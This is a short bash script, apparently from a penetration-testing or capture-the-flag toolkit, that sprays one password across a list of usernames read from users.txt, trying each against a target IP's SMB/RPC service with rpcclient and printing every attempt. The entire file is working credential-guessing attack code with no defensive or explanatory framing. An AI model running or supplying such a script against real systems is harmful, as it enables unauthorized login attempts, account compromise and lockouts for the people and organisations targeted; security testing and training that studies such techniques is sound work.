#!/bin/bash
password=$1
ip=$2
for login in $(cat users.txt); do
  echo -n "[*] $login%$password"
  rpcclient -U "$login%$password" -c "getusername;quit" $ip
  # if success - stop
done

